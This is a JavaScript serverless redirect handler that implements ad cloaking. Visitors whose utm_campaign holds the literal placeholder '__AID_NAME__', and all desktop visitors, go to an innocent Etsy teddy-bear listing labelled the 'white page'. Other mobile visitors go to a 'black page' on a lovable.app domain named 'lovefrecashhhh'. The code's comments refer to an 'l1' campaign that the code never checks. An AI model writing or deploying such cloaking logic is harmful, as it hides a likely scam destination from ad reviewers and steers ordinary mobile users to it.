export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://www.etsy.com/listing/1325605571/spain-teddy-bear-gift-stuffed-animal?ls=s&ga_order=most_relevant&ga_search_type=all&ga_view_type=gallery&ga_search_query=spanish+baby+toys&ref=sr_gallery-1-5&content_source=96f0b7a8-a146-40c2-8af4-f992fc8f3ea4%253ALT8844abdddb76f754892c2221455782d2271d5fa3&organic_search_click=1&logging_key=96f0b7a8-a146-40c2-8af4-f992fc8f3ea4%3ALT8844abdddb76f754892c2221455782d2271d5fa3";
    const blackPageURL = "https://lovefrecashhhh.lovable.app/";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();

  }




